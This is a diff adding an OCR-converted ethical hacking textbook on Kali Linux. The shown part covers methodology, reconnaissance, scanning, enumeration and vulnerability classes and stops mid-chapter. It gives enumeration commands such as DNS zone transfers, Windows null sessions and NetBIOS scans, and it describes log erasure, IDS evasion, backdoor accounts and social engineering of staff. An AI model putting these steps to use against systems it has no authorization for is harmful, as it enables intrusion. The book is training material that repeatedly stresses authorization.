@@ -1,0 +1,3712 @@
+- img_proc: true
+  md: '![](img/c6b688dca6570d17db3036b560ef0905_0_0.png)
+
+
+    ![](img/c6b688dca6570d17db3036b560ef0905_0_1.png)
+
+
+    # # Ethical Hacking
+
+    and Penetration
+
+
+    # # Step by Step
+
+    with Kali Linux
+
+
+    ![](img/c6b688dca6570d17db3036b560ef0905_0_2.png)
+
+
+    Author: Rassoul Ghaznavi-zadeh'
+  merge: -1
+  pgno: 0
+- img_proc: true
+  md: 'Copyright © 2014 by Primedia E-launch LLC
+
+
+    All rights reserved. No part of this publication may be reproduced, distributed,
+    or transmitted in any form or by any means, including photocopying, recording,
+    or other electronic or mechanical methods, without the prior written permission
+    of the publisher, except in the case of brief quotations embodied in critical
+    reviews and certain other non-commercial uses permitted by copyright law. For
+    permission requests, write to the publisher, addressed “Attention: Permissions
+    Coordinator,” at the address below.
+
+
+    Primedia E-launch LLC
+
+    2137 Ash Grove Way, Dallas TX 75228, United States
+
+    +1 469-232-7943
+
+    www.primimedelaunch.com
+
+
+    Ordering Information: This book is available on most of the eBook distributors
+    including Amazon Kindle, Barnes and Noble, and the Apple Bookstore, Kobobooks,
+    and Google Play.
+
+
+    The main category of the book: IT, Computer and Electronics – Ethical Hacking
+
+
+    First Edition
+
+
+    Book name: Ethical Hacking and Penetration, Step by Step with Kali Linux
+
+
+    ISBN: 978-1-63443-088-3
+
+
+    Author: Rassoul Ghaznavavi-zadeh
+
+
+    Certifications: CCNP, CCIP, CCSP, CCSA, CISSP, LPI, Scrum, IIUC, COBIT'
+  merge: -1
+  pgno: 1
+- img_proc: true
+  md: '# Contents
+
+
+    Introduction
+
+    About the Author
+
+    A note from the Author
+
+    Warning
+
+    What is Ethical hacking?
+
+    Types of Ethical hacking
+
+
+    +   - White box
+
+    - Black box
+
+    - Vulnerability assessment
+
+    - Penetration testing
+
+
+    What are the responsibilities of an Ethical Hacker?
+
+    What are the customer''s expectations?
+
+    What are the required skills of the hacker?
+
+    Relevant laws that you need to know
+
+    How to get prepared for the Preparation testing
+
+    Types of attacks
+
+
+    +   - Full penetration
+
+    - Denial of Service
+
+    - Specific Information
+
+    - Social Engineering
+
+
+    Hacking Methodology Overview
+
+
+    +   - Formal Methodology
+
+    - Reconnaissance
+
+    - Scanning
+
+    - Service Enumeration (Fingerprinting)
+
+    - Vulnerability Assessment
+
+    - Vulnerability Exploitation
+
+    - Penetration and Access
+
+    - Privilege Escalation and Owning the Box
+
+    - Evading Defences and Erasing Tracks
+
+    - Maintaining and Expanding Access
+
+
+    Step 1 - Reconnaissance'
+  merge: -1
+  pgno: 2
+- img_proc: true
+  md: '+   * Passive Reconnaissance
+
+    * Active Reconnaissance
+
+    * Putting it all together
+
+
+    Step 2 - Scanning
+
+
+    +   * Scanning live hosts
+
+    * TCP Connection Basics
+
+    * TCP Scan Types
+
+    * UDP Scanning
+
+    * ICMP Scanning
+
+
+    Step 3 - Port and Service Enumeration
+
+
+    +   * Identifying Ports and Services
+
+    * OS Fingerprinting
+
+    * Popular Scanners
+
+
+    Step 4 - Data Enumeration
+
+
+    +   * What is it?
+
+    * SNMP Enumeration
+
+    * DNS Zone Transfers
+
+    * Windows Null Sessions
+
+
+    Step 5 - Vulnerabilities Assessment
+
+
+    +   * OS Vulnerabilities
+
+    * Web Server Vulnerabilities
+
+    * Database Vulnerabilities
+
+    * TCP Stack Vulnerabilities
+
+    * Application vulnerabilities
+
+    * Vulnerabilities Assessment
+
+
+    Step 6 - Penetration, Access, and Compromise
+
+
+    +   * Actual attack starts
+
+    * Bypassing Access Controls
+
+    * Password Cracking
+
+    * Social Engineering
+
+    * Session Hijacking
+
+    * Privilege Escalation
+
+    * Maintaining and Expanding access
+
+    * System Compromise'
+  merge: -1
+  pgno: 3
+- img_proc: true
+  md: '# Step 7 - Evading Defences and Erasing Tracks
+
+
+    +   * Where are your actions recorded?
+
+    * Deleting Log files and other evidence
+
+    * Rootkits
+
+    * Steganography
+
+    * Evading IDS and Firewalls
+
+
+    # Introduction to Hacking Techniques
+
+
+    +   * Buffer Overflows
+
+    * Sniffers
+
+    * Wireless Hacking
+
+    * SQL Injection
+
+    * Rootkits
+
+    * Spoofing
+
+    * Denial of Service (DoS) attacks
+
+    * Web hacking
+
+
+    # Popular Hacking Tools
+
+
+    +   * Nmap
+
+    * Superscan
+
+    * Nesus
+
+
+    Ethical Hacking and Penetration Certifications
+
+    Penetration Testing with Kali Linux
+
+    Penetration testing and Digital Forensics Tool kit
+
+    Kali Linux Installation and usage
+
+
+    +   * Live CD
+
+    * Live USB
+
+    * Installed to disk
+
+
+    Installing on Virtual machine
+
+    Wireless Penetration
+
+    Wireless Transmission Power adjustment
+
+    Discovering an AP which is hiding its SSID
+
+    Bypassing MAC address filtering on Wireless
+
+    Breaking Wireless WEP passwords
+
+    Breaking Wireless WPA2
+
+    Rogue Access Point
+
+    Mis-Association attacks on wireless'
+  merge: -1
+  pgno: 4
+- img_proc: true
+  md: 'Wireless Man in the middle attack using bridging\NNmap - Free Security Scanner
+
+    DHCP Starvation attack
+
+    Become the Root of Spanning Tree
+
+    CDP Flooding attack (DoS)
+
+    HSRP DoS attack
+
+    Converting Access port to a 802.1q trunk port using DTP
+
+    ARP Spoofing and MITM (Man In The Middle Attack)
+
+    Metasploit Framework
+
+    Metasploit Framework (MSF) using Modules, Payloads and exploits
+
+    Using an attacked host as a “Pivot point” for further attacks
+
+    Vulnerability Scanning with OpenVAS and Metasploit
+
+    Take control of Android phone using Armitage
+
+    Social Engineering Toolkit
+
+    Ettercap, Xplico and MITM attack
+
+    DNS Spoofing
+
+    Dictionary attacks using Hydra and SSH
+
+    Data Collection with Maltego
+
+    Burp Suite
+
+
+    +   * Analyse the communication details between client and web server
+
+    * Getting Started With Burp Proxy
+
+    * Using Burp Proxy
+
+    * Getting Set Up
+
+    * Intercepting Requests and Responses
+
+    * Using the Proxy History
+
+    * Driving Your Testing Workflow
+
+    * Key Configuration Options
+
+    * Using Burp Suite
+
+    * Testing Workflow
+
+    * Recon and Analysis
+
+    * Tool Configuration
+
+    * Vulnerability Detection and Exploitation
+
+    * Kali Linux on Raspberry Pi
+
+    * Scapy - Packet Manipulation Tool - Capture, create, play, discover, HPing 3
+
+    * IPv6 neighbor discovery
+
+    * Router Discovery'
+  merge: -1
+  pgno: 5
+- img_proc: true
+  md: 'Prefix Discovery
+
+    Parameter Discovery
+
+    Address Auto-configuration
+
+    Address Resolution
+
+    Next-Hop Determination
+
+    Neighbor Unreachability Detection
+
+    Duplicate Address Detection
+
+    Redirection
+
+    MITM attack on IPv6 with Parasite 6
+
+    IPv6 Tools from THC (The Hackers Choice)
+
+    Personalized Dictionary Lists with CIPP (Common User Password Profiler)
+
+    Accessing the SAM database and cracking passwords
+
+    Describe and Use a Rainbow Table
+
+    Hacking a vulnerable website with PHP, MYSQL using Sqlmap
+
+    Wireshark protocol analyser
+
+    Detecting a Root kit
+
+    Creating a test BED with Virtual box
+
+    Steps to install Kali Linux on Virtual box'
+  merge: -1
+  pgno: 6
+- img_proc: true
+  md: '# Introduction
+
+
+    This book is a complete guide for those who would like to become an Ethical hacker.
+    In this book you will learn what the Ethical hacking and its procedure is. The
+    first couple of chapters are the definitions, concepts and process of becoming
+    an Ethical hacker while the next half of the book will show in detail how to use
+    certain tools and techniques to initiate attacks and penetrate a system.
+
+
+    After reading this book, you should be able to use these tools to do some testing
+    and even working on penetration projects. You just need to remember not to use
+    these techniques in a production environment without having a formal approval.
+
+
+    On each section, we have provided the commands used to achieve the penetration
+    goal. You need to follow the commands and change the parameters or names to suit
+    your environment.'
+  merge: -1
+  pgno: 7
+- img_proc: true
+  md: '# About the Author
+
+
+    Rassoul Ghaznavi-zadeh, the author, has been an IT security engineer since 1999.
+    He started as a Cisco engineer and developed his networking and security knowledge
+    around technologies like Cisco, Checkpoint, Juniper and also processes like ISO
+    27001, PCI.
+
+
+    He also has some extensive background around Linux systems and services and security
+    tools available on them. Rassoul has helped a lot of enterprise organizations
+    to have a safe and secure environment by testing, auditing and providing recommendations.
+
+
+    Rassoul has multiple international certificates around networking, security and
+    architecting enterprise IT.'
+  merge: -1
+  pgno: 8
+- img_proc: true
+  md: '# A note from the Author
+
+
+    After working in this industry for a long time, I have decided to write a book
+    and share my knowledge and experience with others. I hope you find this book useful
+    and if I can help my bit to keep the technology industry be safer and more secure.
+    I tried to avoid having long paragraphs and structure this book like a presentation
+    so you won''t get bored.
+
+
+    For those who buy this book, I am available on Linkedin for any follow up. Add
+    me to your network and ask any question you might have and I am more than happy
+    to assist.
+
+
+    I''d like to present this book to my wife and daughter who have always been with
+    me and helped sparing some time to write this book.'
+  merge: -1
+  pgno: 9
+- img_proc: true
+  md: '# Warning
+
+
+    The techniques you learn in this book are not meant to be used in any production
+    environment for abusiveness purposes. It is illegal to use these techniques without
+    having a formal permission from the management team in any organization.
+
+
+    The main purpose and aim is to keep the technology environment secure by doing
+    these tests as an Ethical hacker within a specified agreement with the customers.
+
+
+    Do not use these techniques without written authorization. It is illegal and it
+    can put you in trouble.'
+  merge: -1
+  pgno: 10
+- img_proc: true
+  md: '# What is Ethical hacking?
+
+
+    Ethical hacking is a technique to find out the vulnerabilities on the network
+    and systems and recommend how to protect them. The techniques that you learn on
+    this book are purely white hacking techniques to find the holes and risks on the
+    networks and systems.
+
+
+    These techniques must not be used on any production network without having a formal
+    approval from the management team. Using these techniques without having an approval
+    can be illegal and can cause serious damage to others properties.'
+  merge: -1
+  pgno: 11
+- img_proc: true
+  md: "# Types of Ethical hacking\n\nThere are multiple types of Ethical hacking but\
+    \ usually they can be categorized as below\n\n+   * White box\n  * When we have\
+    \ full knowledge of the network and the also the systems on the network. The attacker\
+    \ can be an old employee, relative, vendor or a contractor who has a complete\
+    \ understanding of the infrastructure, software and hardware used within the destined\
+    \ company.\n* Black box\n  * When we have no knowledge of the infrastructure and\
+    \ try to penetrate without any information. On this type of attack, usually the\
+    \ first step of type of attacks is to gather enough information about the company,\
+    \ infrastructure and systems. Once all the required information obtained next\
+    \ step is to find the vulnerabilities and try to exploit them.\n* Vulnerability\
+    \ assessment\n  * This is purely assessing the vulnerabilities on the network\
+    \ and analysing them. This is usually a safe work and won't have any effect on\
+    \ operation. Most of the times the techniques in this category are not illegal\
+    \ but it is always safe to inform people prior to doing that as there could be\
+    \ some complications.\n* Penetration testing\n  * This is a type of attack that\
+    \ we try to take over the control of the system or a device. With the techniques\
+    \ in this category there is a high risk of potential interruption to the operation\
+    \ of a device or network. Using these techniques without having a formal approval\
+    \ and commitment from the destined company is illegal."
+  merge: -1
+  pgno: 12
+- img_proc: true
+  md: '# What are the responsibilities of an Ethical Hacker?
+
+
+    As an Ethical hacker you have a clear responsibly about how you use your knowledge
+    and techniques. It is also very important to understand what the expectations
+    from an Ethical hacker are and what you should consider when assessing the security
+    of a customer’s organization.
+
+
+    Below are a couple of important things you must consider as an Ethical hacker:
+
+
+    +   * Must use your knowledge and tools only for legal purposes
+
+    * Only hack to identify security issues with the goal of defence
+
+    * Always seek management approval before starting any test
+
+    * Create a test plan with the exact parameters and goals of test and get the management
+    approval for that plan
+
+    * Don’t forget, your job is to help strengthen network and nothing else!'
+  merge: -1
+  pgno: 13
+- img_proc: true
+  md: '# What are the customer’s expectations?
+
+
+    It is very important to understand the customer’s expectation before starting
+    any work. As the nature of this work (Ethical hacking) is high risk and requires
+    a lot of attentions; if you don''t have a clear understanding of their requirements
+    and expectations, the end result might not be what they want and your time and
+    effort will be wasted. This could also have some legal implications as well if
+    you don’t follow the rules and address customer’s expectation.
+
+
+    Below are some important things you should note:
+
+
+    +   * You should work with customer to define goals and expectations
+
+    * Don’t surprise or embarrass them by the issues that you might find
+
+    * Keep the results and information confidential all the time
+
+    * Company usually owns the resultant data not you
+
+    * Customers expect full disclosure on problems and fixes'
+  merge: -1
+  pgno: 14
+- img_proc: true
+  md: '# What are the required skills of the hacker?
+
+
+    To be an Ethical hacker you should have extensive knowledge about a range of devices
+    and systems. Ideally you should have multiple years of experience in IT industry
+    and be familiar with different hardware, software and networking technologies.
+
+
+    Some of the important skills required to be an Ethical hacker are as below:
+
+
+    +   - Should already be a security expert in other areas (perimeter security,
+    etc.)
+
+    - Should already have experience as network or systems administrator
+
+    - Experience on wide variety of Operating Systems such as Windows, Linux, Unix,
+    etc.
+
+    - Extensive knowledge of TCP/IP - Ports, Protocols, Layers
+
+    - Common knowledge about security and vulnerabilities and how to correct them
+
+    - Must be familiar with hacking tools and techniques (We will cover this in this
+    book)'
+  merge: -1
+  pgno: 15
+- img_proc: true
+  md: "# Relevant laws that you need to know\n\nWe won't be talking about these laws\
+    \ in this book but it is always a good idea if you look for these laws online\
+    \ and understand their requirements and basics. Each country might have their\
+    \ own specific law which can be different than others. There are some important\
+    \ laws in US which are:\n\n+   * Title 18 USC 1029\n  * Fraud and related activity\
+    \ in connection with access devices\n* Title 18 USC 1030\n  * Fraud and related\
+    \ activity in connection with computers\n* Title 18 USC 3121-27\n  * General prohibition\
+    \ on pen register and trap and trace device use; exception\n* Title 18 USC 2510-22\n\
+    \  * Wire and electronic communications interception and interception of oral\
+    \ communications\n* Other statutes\n* A good reference to look at the Laws:\n\
+    \  * http://www.law.cornell.edu/uscode/text"
+  merge: -1
+  pgno: 16
+- img_proc: true
+  md: '# How to get prepared for the Preparation testing
+
+
+    Once you want to start a penetration project, there are number of things you need
+    to consider. Remember, without following the proper steps, getting approvals and
+    finalizing an agreement with customer; using these techniques is illegal and against
+    the law.
+
+
+    Important things to consider before you start:
+
+
+    +   * Get signed approval for all tests from the customer
+
+    * You need to sign confidentiality agreement (NDA)
+
+    * Get approval of collateral parties (ISPs)
+
+    * Put together team and tools and get ready for the tests
+
+    * Define goals (DoS, Penetration, etc.)
+
+    * Set the ground rules (rules of engagement with the customer and team)
+
+    * Set the schedule (non-work hours, weekends?)
+
+    * Notify appropriate parties (Sys admin, Security department, Legal department,
+    law enforcement)'
+  merge: -1
+  pgno: 17
+- img_proc: true
+  md: "# Types of attacks\n\nThere are number of different attacks that can be done\
+    \ on a network or system. The main categories are explained below:\n\n+   * Full\
+    \ penetration\n  * Taking full control of the system and accessing the resources\
+    \ and data. This is a very complex and difficult task and requires spending a\
+    \ long time investigating the vulnerabilities and ways to access a system.\n\n\
+    +   * Denial of Service\n  * Interrupting the system’s operation and affecting\
+    \ the users. This is usually an easier type of attack which can be achieved with\
+    \ spending less time and effort, however; can be a big problem in big organizations.\n\
+    \n+   * Specific Information\n  * Theft or disclosure of the documents or information.\
+    \ This could be accessing documents or penetrating a database but usually attacker\
+    \ is looking for some specific information and not interested in damaging any\
+    \ system.\n\n+   * Social Engineering\n  * The art of manipulating people so they\
+    \ give up confidential information. This is perhaps the easiest way of attacking\
+    \ and won’t require any technical knowledge. Attacker will usually use the users,\
+    \ administrators or employees to get the information out of them and use those\
+    \ information to penetrate the systems."
+  merge: -1
+  pgno: 18
+- img_proc: true
+  md: "# Hacking Methodology Overview\n\nThere are number of steps that need to be\
+    \ followed to plan and implement penetration project. We will explain each one\
+    \ in detail later in this book, however; summary of steps can be found below.\n\
+    \n+   Formal Methodology\n  - A good methodology provides structured framework\
+    \ for testing and procedure. Below are some notes which can be useful to implement\
+    \ your methodology.\n    - Ensures you do not overlook venues of attack and possible\
+    \ vulnerabilities\n    - Provides a comprehensive testing plan. You can use the\
+    \ below standards:\n      - OSSTMM - Open Source Security Testing Methodology\
+    \ Manual\n        - A widely used, peer-reviewed, methodology for performing security\
+    \ tests\n      - NIST SP 800-42\n        - Technical Guide to Information Security\
+    \ Testing and Assessment\n      - TRAWG\n        - TRAWG stands for Threat and\
+    \ Risk Assessment Working Guide\n      - OCTAVE\n        - Operationally Critical\
+    \ Threat, Asset, and Vulnerability Evaluation\n\n+   Reconnaissance\n  - This\
+    \ is the first step in penetration testing. The point is to gather as much as\
+    \ information about the Target Company, network, infrastructure or personnel as\
+    \ possible. There are two different types of gathering information; active (calling,\
+    \ talking, visiting, etc.) and passive (finding information"
+  merge: -1
+  pgno: 19
+- img_proc: true
+  md: "on websites, jobs advertisement, etc.)\n\n+   * Scanning\n  On this step networks\
+    \ are scanned to determine which hosts are live on network and what they do. There\
+    \ are multiple types of scans and tools available. Most popular ones are Nmap\
+    \ and Supercan.\nThe scans can easily be picked up by Intrusion Detection Systems,\
+    \ although; there are ways to avoid this with specific scans.\n\n+   * Service\
+    \ Enumeration (Fingerprinting)\n  This step follows the scanning step after determining\
+    \ which hosts are live. Tools will be used to discover what hosts are running\
+    \ to determine vulnerabilities. Fingerprinting tools are often combined with scanners\
+    \ and we can get both reports at once.\n\n+   * Vulnerability Assessment\n  This\
+    \ step will be used to determine what vulnerabilities exist with an app or a service\
+    \ on a tool. In this step known vulnerability databases and compare the responses\
+    \ from the target device with the database to find a match. The Targets are all\
+    \ popular Operating Systems and applications.\nessus is the most popular assessment\
+    \ tool in this category which is an open source with a freeedition.\n\n+   * Vulnerability\
+    \ Exploitation\n  At this stage vulnerabilities discovered in previous steps are\
+    \ exploited with known exploits or by developing new ones. Vulnerabilities are\
+    \ exploited to penetrate and gain access to systems.\n\n+   * Penetration and\
+    \ Access\n  This is the stage where hacking actually occurs. All previous stages\
+    \ are planning only and we will try to take control of the target at this step.\
+    \ Systems are penetrated based upon exploited vulnerabilities identified in previous\
+    \ steps."
+  merge: -1
+  pgno: 20
+- img_proc: true
+  md: 'Access to systems at various levels is attempted and tested. Metasploit framework
+    is a popular tool in this category which will be explained later in this book.
+
+
+    +   Privilege Escalation and Owning the Box
+
+    The Goal at this stage is administrative access or access privilege information.
+    Hacker may start as guest level of access or normal user and uses exploits to
+    increase the privilege levels. Remember Owning the box = Full Control
+
+
+    +   Evading Defences and Erasing Tracks
+
+    Hackers must evade defences like IDS, FW, IPS to penetrate and access the systems.
+    They must avoid detection or penetration will be short-lived. Remember, most of
+    the medium and large size organizations have detection mechanisms in place. Erasing
+    tracks, deleting log files, resetting permissions, hiding hacker tools on system
+    with rootkits are some of the common steps in this category.
+
+
+    +   Maintaining and Expanding Access
+
+    Once penetration is complete, access must be maintained and expanded. Rootkits
+    often used to keep access, hide the running processes and tools, along with backdoor
+    accounts. Access can be expanded to increase target and further penetration into
+    network.'
+  merge: -1
+  pgno: 21
+- img_proc: true
+  md: "# Step 1 - Reconnaissance\n\n+   * Passive Reconnaissance\n  * This step is\
+    \ used to gather information about a company, network, or other target with using\
+    \ any intrusive means\n  * It is very difficult to detect/defend against the target\
+    \ company\n  * Most of these information are publicly available on web, newspapers,\
+    \ advertisements, brochures, etc.\n  * You can use resources like company websites,\
+    \ Exchange commission, better business bureau, literature, job site posting (e.g.\
+    \ if Nortel skills will require you know they have Nortel equipment), partner\
+    \ sites, etc.\n  * Information can include name of company officers, addresses\
+    \ of major locations (data centres), partner network and connections, types of\
+    \ systems used (FW, IDS, etc.), IP address space, domain names, etc.\n  * Gathering\
+    \ Information with Whois and other Tools\n    * Name of administrators, IP address\
+    \ space, location, Email addresses, phone number, etc.\n  * Other tools include\
+    \ Sam Spade and web based tools are also available\n  * One popular tool is Maltego\
+    \ on Kali Linux which will be explained later in this book\n\n+   * Active Reconnaissance\n\
+    \  * At this stage hacker uses more intrusive methods to gather information and\
+    \ actively touches target sites and networks as a normal user\n  * It does not\
+    \ involve a hacking system\n  * May involve personal contact or site visits\n\
+    \  * Some Tools and Methods:\n    * Banner Grabbing - Telnet/SSH to devices and\
+    \ read the banner to identify what it is\n    * Mail Bouncing - Send an email\
+    \ to wrong email address to check the bounce message and identify the mail servers"
+  merge: -1
+  pgno: 22
+- img_proc: true
+  md: '+   - DNS Zone Transfers - To get a list of all the available servers and hosts
+
+
+    +   - View company’s public web site source code and directory structure - To
+    identify the type of possible CMS they are using
+
+
+    +   - Social Engineering - e.g. Find out where Sysadmin goes after work and with
+    him, socialize and make friend and get the information out of him!
+
+
+    +   - Shoulderer Surfing - Stand on someone’s shoulder, watch and gather information
+    like passwords, codes, etc.
+
+
+    +   - Dumpster Diving - This is mainly done by local people who stole information
+
+
+    +   - Piggybacking/Site Visits – E.g. Following people, visiting sites and bypassing
+    security.
+
+
+    +   - Putting it all together
+
+
+    +     - Use reconnaissance techniques to footprint and organization’s structure
+    and network
+
+
+    +     - Gather publicly available or easily obtained info about target organization
+
+
+    +     - Use this info to determine weaknesses and organization boundaries
+
+
+    +     - Examples include names, addresses, titles, phone numbers or company personnel
+
+
+    +     - IP address range and domain structure (e.g. using BGP or Lookups)
+
+
+    +     - Infrastructure layout and software used
+
+
+    +     - Document all the findings in this step and put them together
+
+
+    +     - The information gained at this step serves as starting point for next
+    steps'
+  merge: -1
+  pgno: 23
+- img_proc: true
+  md: "# Step 2 - Scanning\n\n+   - Scanning live hosts\n  - This step is looking\
+    \ for live hosts on the network that their services may be later enumerated\n\
+    \  - It can be intrusive and maybe detected by IDS\n  - Maybe illegal in some\
+    \ places and need the pre-approval. You need to check before doing this in production\n\
+    \  - Usually identified by system administrators and will be logged on logging\
+    \ servers Methods exist to reduce visibility of scan - e.g. delayed scans or FIN,\
+    \ Null or Xmas scan\n  - Uses tools known as scanners as Supercan, nmap, etc.\n\
+    - TCP Connection\n  - TCP and UDP are most common protocol on the networks and\
+    \ internet. You need to understand how TCP works to be able to use the scanning\
+    \ tools and initiate an attack.\n  - TCP includes 6 TCP flags that are set in\
+    \ packets\n  - TCP Flags indicate whether packet is initial (syn), acknowledgement\
+    \ (ack), finish (fin), urgent (urg), push (psh) or reset (rst)\n  - TCP Uses 3-way\
+    \ handshake to establish and maintain the sessions which includes the below steps\
+    \ between the Source and Destination devices:\n    - Syn (source to dest) -> syn-ack\
+    \ (dest to source) -> ack (source to dest)\n  - Many attacks use non-standard\
+    \ combinations of these flags (malformed packets) to elicit response from host\
+    \ or attack host\n  - Syn flood: It is a Dos attack where source computer sends\
+    \ only syn packets. As a result there will be a lot of open-half sessions on the\
+    \ victim machine and it will be overloaded and not usable.\n- Scan Types\n  -\
+    \ Full scan: completes all 3 parts of the 3-way handshake. This is the most reliable\
+    \ scan but very noisy and can be easily picked up by IDS systems"
+  merge: -1
+  pgno: 24
+- img_proc: true
+  md: '+   - Half open (syn) scan: only uses first part (syn) of the handshake to
+    get-syn-ack won''t send the third part (ack) back. This also can be picked by
+    IDS systems
+
+    - Stealth Scan: Varies time and frequency of scan to avoid detection by IDS. This
+    is not a full connect scan
+
+    - Xmas Scan: malformed packet that sets fin, urg, and push flags; This is used
+    to bypass firewalls
+
+    - Ack Scan: Sending only an ack packet; receiving end won''t know how to respond
+    as there was no handshake; causes open ports to return a reset
+
+    - FIN Scan: Sending a packet with fin flag set; This can usually bypass the IDS
+    systems
+
+    - Null Scan: Sending a packet with no flag set; This can also bypass the IDS systems
+    in most cases
+
+
+    +   - UDP Scanning
+
+    - Unlike TCP, UDP protocol doesn''t have too many controls and handshakes. The
+    process of UDP stream is much simpler.
+
+    - Source device will send a UDP request and the destination will respond.
+
+    - UDP scanning scans only for UDP packets
+
+    - It is less reliable than TCP scanning
+
+    - Maybe of limited value, since UDP or ICMP may be blocked at the firewall
+
+
+    +   - ICMP Scanning
+
+    - ICMP is the most common protocol to
+
+    - Ping scanning is the most common way of scanning
+
+    - Live hosts may respond to ICMP Type 0 or 8
+
+    - Most network scanners include ping scans
+
+    - Usually it will trigger IDS alerts and is detectable'
+  merge: -1
+  pgno: 25
+- img_proc: true
+  md: "# Step 3 - Port and Service Enumeration\n\n+   * Identifying Ports and Services\n\
+    \  * This step will be the next after Scanning to determine live hosts\n  * Identifying\
+    \ services and open ports tells what function box is performing and what OS is\
+    \ running\n  * Exploitation of those services can begin after this step\n  * Port\
+    \ scans are run to determine what ports on computer is listening on\n  * Ping/Port/Service\
+    \ scans are frequently run together using the same tool\n\n+   * OS Fingerprinting\n\
+    \  * This step is used to determine what OS on target system is running, then\
+    \ exploit vulnerabilities associated with that OS\n  * IT works based on the fact\
+    \ that some OSes implement TCP/IP stack differently and responds to certain scans\
+    \ determine the type of OS\n  * Some OSes run particular services on certain ports\
+    \ and this is another way of identifying their OS\n    * Example: 137,138,139,445\
+    \ indicate windows 2000 or above\n\n+   * Popular Scanners\n  * Foundstone SuperScan\
+    \ - Windows base application now owned by Mcafee\n  * Nmap\n    * Nmap is the\
+    \ most popular scanner which is *nix based. It has a windows version as well.\n\
+    \    * Offers full, half, stealth & UDP scan"
+  merge: -1
+  pgno: 26
+- img_proc: true
+  md: "# Step 4 - Data Enumeration\n\n+   * What is it?\n  * Grabbing detailed system\
+    \ specific information about the systems, networks and hosts\n  * Utilized various\
+    \ techniques that aren’t defined as exploits\n  * Non-Intrusive way to gain valuable\
+    \ technical information\n  * Information include:\n    * SNMP communities, MIB\
+    \ specific information\n    * Usernames and Groups\n    * Advertising Services\
+    \ such as Master Browser\n\n+   * SNMP Enumeration\n  * Default community string\
+    \ for most of the devices is ‘public’\n  * The public string could have various\
+    \ permissions to get the information\n  * MIBs contain extensive system specific\
+    \ information which can be gained\n  * Kali Linux can be used for number of SNMP\
+    \ tests\n\n+   * DNS Zone Transfers\n  * DNS service is the core name resolution\
+    \ service for any organization\n  * DNS servers use lookup and zone transfers\
+    \ to synchronize the records between themselves\n  * Linux B and Microsoft DNS\
+    \ are the most common DNS servers\n  * Zones are owned by DNS servers and if they\
+    \ allow the zone transfer you can get a complete list of DNS records which can\
+    \ identify all hosts on the network\n  * Nlookup provides simple name resolution\
+    \ interface\n    * Can be used for on-the-fly zone transfers\n    * Zone transfers\
+    \ can footprint an entire network with ease\n    * Example: This below return\
+    \ all the DNS records (Need to be allowed by primary DNS server)\n    * nslookup"
+  merge: -1
+  pgno: 27
+- img_proc: true
+  md: "+   * set type=any\n* set type=ALL\n* ls -d \"yourdomain.com\"\n\n# Windows\
+    \ Null Sessions\n\n+   * Microsoft Windows uses SMB (Server Message Block) for\
+    \ data sharing and advertisement of services\n* Alternative CIFS can be used as\
+    \ non-windows replacement\n* Null sessions are established by using a 'null' user\
+    \ account\n* Null sessions can be used for enumeration system information\n* Example\
+    \ of connecting to a Windows machine using null account:\n  * net use \\\\192.168.66.132\\\
+    $ /user:null\n  * net view\n\n+   * NETBIOS Enumeration\n  * Netbios operates\
+    \ with or without a WINS server\n  * Its operation is primarily based on broadcast\n\
+    \  * It relies on advertisement\n  * Advertisements include services, roles, drives\n\
+    \  * Netstat can be used for enumeration information\n  * NBTS is another command\
+    \ tool\n  * Example:\n    * (On Kali Linux)\n      * nbtscan 192.168.1.130\n \
+    \     * /smbgetserverinfo -I 192.168.1.130\n      * /smbdumpers -I 192.168.1.130\
+    \ -v\n    * (On Windows)\n      * nbtstat -a 192.168.1.130\n* Active Directory\
+    \ Extraction\n  * Uses LDAP protocol\n  * Ldp.exe is a simple LDAP client\n  *\
+    \ Authenticate with Guest or no permissions at all"
+  merge: -1
+  pgno: 28
+- img_proc: true
+  md: "# Step 5 - Vulnerabilities Assessment\n\n+   * OS Vulnerabilities\n  * A note\
+    \ is to remember, all Operating Systems have vulnerabilities (not just windows!)\n\
+    \  * Exploits may be listed on hacker sites which can be seen and used\n  * OS\
+    \ exploits are used to penetrate/gain access to system\n  * Vulnerabilities can\
+    \ be used to cause DoS attacks\n  * OS vulnerabilities include:\n    * Buffer\
+    \ overflow\n    * TCP stack vulnerabilities\n    * Default permission settings\n\
+    \    * Default security settings\n    * Most holes exist from default services\
+    \ and applications\n      * Rlogin\n      * Remote Procedure Call (RPC)\n    \
+    \  * Server Message Block (SMB)\n      * Windows Management Instrumentation (WMI)\n\
+    \      * Local Security Authority Subsystem Service (LSASS)\n      * X-Server\n\
+    \      * SAMBA\n* Vulnerabilities are security flaws in software\n  * Usually\
+    \ caused by poor coding\n  * Exploit are ways to use the vulnerabilities to break\
+    \ security of system\n  * Several ways and methods to use exploits to gain access\n\
+    \  * Scanners can be used to find vulnerabilities (Nessus, Nikto, OpenVAS)\n \
+    \ * Use security web sites to identify the vulnerabilities (Bugtraq, CVE sites)\n\
+    \  * Use Vendor’s sites security reports\n* Vulnerabilities/Exploits include:\n\
+    \    * OS vulnerabilities\n    * Web server/app vulnerabilities\n    * Database\
+    \ vulnerabilities"
+  merge: -1
+  pgno: 29
+- img_proc: true
+  md: "+   ○ TCP Stack vulnerabilities\n○ Virus/Trojan/Malware susceptibility\n* Multifunctional\
+    \ Exploit include:\n  ○ Nessus\n  ○ Metasploit Framework\n\n+   * Web Server Vulnerabilities\n\
+    \  * Vulnerabilities are available on all popular web servers (IIS, Apache, Tomcat)\n\
+    \  * There is a higher risk due to connection to Internet\n  * May be protected\
+    \ by external firewall/DMZ\n  * Usually easier to exploit due to poor security\n\
+    \  * Common examples of Web Server Vulnerabilities\n    ○ Passwords stored in\
+    \ website code\n    ○ Ability to traverse directories\n    ○ Ability to execute\
+    \ scripts or programs\n    ○ Ability to bypass URL checking and return a command\
+    \ prompt\n    ○ Improperly patched and configured servers\n  * Actions which can\
+    \ be done after exploits are discovered:\n    ○ Root Access\n    ○ Web Site defacement\n\
+    \    ○ Denial of Service\n    ○ Theft or alteration of data on server\n    ○ Further\
+    \ penetration into network\n\n+   * Database Vulnerabilities\n  * Common examples\
+    \ of Database Vulnerabilities include:\n    ○ Misconfiguration of permissions\
+    \ and roles\n    ○ Badly constructed database objects (tables, DML and DDL statements)\n\
+    \    ○ SQL Injection Attack\n    ○ Default DB passwords left unchanged\n    ○\
+    \ Vulnerable to the application they serve\n    ○ Poor application coding and\
+    \ security\n\n+   * TCP Stack Vulnerabilities\n  * All Operating Systems and applications\
+    \ have TCP vulnerabilities"
+  merge: -1
+  pgno: 30
+- img_proc: true
+  md: "+   * Common examples of TCP vulnerabilities and attacks:\n  * TCP Sequence\
